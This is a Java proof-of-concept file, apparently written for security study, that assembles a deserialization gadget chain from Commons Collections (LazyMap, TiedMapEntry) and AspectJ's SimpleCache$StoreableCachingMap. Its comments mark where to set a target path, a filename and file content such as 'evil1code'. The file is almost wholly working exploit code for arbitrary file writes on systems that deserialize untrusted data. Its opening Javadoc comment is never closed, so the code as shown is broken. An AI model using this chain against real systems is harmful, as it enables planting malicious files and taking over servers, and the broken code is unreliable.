package upload;

import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.nio.charset.StandardCharsets;
import java.util.HashMap;
import java.util.Map;

/**
 * CC6的前半段 
 * LazyMap.get()
 * SimpleCache$StorableCachingMap.put()
 * SimpleCache$StorableCachingMap.writeToPath()
 * SimpleCache$StorableCachingMap.FileOutputStream()

  
public class aspectj {
    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException {
        Class clazz = Class.forName("org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap");
        Constructor declaredConstructor = clazz.getDeclaredConstructor(String.class, int.class);
        declaredConstructor.setAccessible(true);

      
        HashMap map = (HashMap)declaredConstructor.newInstance("C:\\Users\\86136\\Desktop\\cc1\\src\\main\\java\\upload",123);     //路径
//        map.put("1.txt","456".getBytes(StandardCharsets.UTF_8));



      //LazyMap.get()中先调用了transform然后调用map.put(key,value)
        ConstantTransformer constantTransformer = new ConstantTransformer("evil1code".getBytes(StandardCharsets.UTF_8));  //内容
        Map decorate = LazyMap.decorate(map, constantTransformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(decorate, "1.txt");      //文件名
        HashMap hashMap = new HashMap(); 
        hashMap.put(tiedMapEntry,"bbb");
        decorate.remove("1.txt");
      
//        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
//        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
//
//        objectOutputStream.writeObject(hashMap);

//        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray());
//        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
//        objectInputStream.readObject();


    }
}
